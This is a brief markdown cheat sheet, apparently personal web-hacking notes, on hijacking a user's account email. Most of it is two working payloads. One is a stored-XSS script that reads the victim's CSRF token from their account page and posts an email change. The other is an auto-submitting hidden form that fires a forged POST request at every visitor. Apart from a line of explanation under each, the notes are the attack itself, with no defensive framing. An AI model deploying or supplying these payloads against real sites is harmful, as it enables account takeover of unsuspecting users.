# Changing someone's email via XSS
- If the webpage is vulnerable to stored XSS, we can inject our payload to make it change the email or any other similar attribute of that user to any other value of our choice. 
```HTML
<script>  
var req = new XMLHttpRequest();  
req.onload = handleResponse;  
req.open('get','/my-account',true);  
req.send();  
function handleResponse() {  
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  
    var changeReq = new XMLHttpRequest();  
    changeReq.open('post', '/my-account/change-email', true);  
    changeReq.send('csrf='+token+'&email=test@test.com')  
};  
</script>
```
- this steals the victim's csrf token to make post request to change the email of that user.
# Changing someone's email via CSRF
- We can host another HTML page from the server and access it via the target (if we're allowed to do that) and the HTML page will make a malicious request. 
```HTML
<form method="POST" action="https://target-url/endpoint">
	<input type="hidden" name="param-name" value="param-value">
</form>
<script>
	document.forms[0].submit();
</script>
```
- This will send a post request to change the viewer's email address everytime someone visits that page.